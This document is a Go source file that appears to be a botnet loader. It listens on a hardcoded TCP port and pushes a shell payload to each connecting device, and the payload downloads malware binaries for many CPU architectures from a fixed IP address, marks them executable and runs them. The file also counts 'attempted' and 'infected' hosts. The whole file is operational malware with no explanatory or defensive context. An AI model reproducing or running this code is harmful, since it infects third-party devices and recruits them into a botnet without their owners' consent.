package main

import (
	"fmt"
    "net"
    "time"
    "strings"
)

var payload string = `
cd /dev

wget http://107.174.24.12/arm
chmod 777 arm
./arm milkyway

wget http://107.174.24.12/arm5
chmod 777 arm5
./arm5 milkyway

wget http://107.174.24.12/arm6
chmod 777 arm6
./arm6 milkyway

wget http://107.174.24.12/arm7
chmod 777 arm7
./arm7 milkyway

wget http://107.174.24.12/sh4
chmod 777 sh4
./sh4 milkyway

wget http://107.174.24.12/arc
chmod 777 arc
./arc milkyway

wget http://107.174.24.12/mips
chmod 777 mips
./mips milkyway

wget http://107.174.24.12/mipsel
chmod 777 mipsel
./mipsel milkyway

wget http://107.174.24.12/sparc
chmod 777 sparc
./sparc milkyway

wget http://107.174.24.12/x86_64
chmod 777 x86_64
./x86_64 milkyway

wget http://107.174.24.12/i686
chmod 777 i686
./i686 milkyway

wget http://107.174.24.12/i586
chmod 777 i586
./i586 milkyway

/var/Sofia 2>/dev/null &
`

var dirChange, statusAttempted, statusInfected, echoDropped, statusFailed int

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func loaderThread(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 512)
	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

	conn.Write([]byte(payload))

	statusAttempted++
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	for {
		le, err := conn.Read(buf)
		if err != nil || le <= 0 {
			break
		}

		if strings.Contains(string(buf), "listening") {
			statusInfected++
			break
		}
	}

	zeroByte(buf)
	return
}

func main() {

	li, err := net.Listen("tcp", "2.57.122.185:1245")
	if err != nil {
		return
    }

	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Attempted %d | Infected %d\r\n", i, statusAttempted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	} ()

	go func() {
		for {
			conn, err := li.Accept()
			if err != nil {
				break
			}

			go loaderThread(conn)
		}
	} ()

    for {
        time.Sleep(1 * time.Second)
    }
}
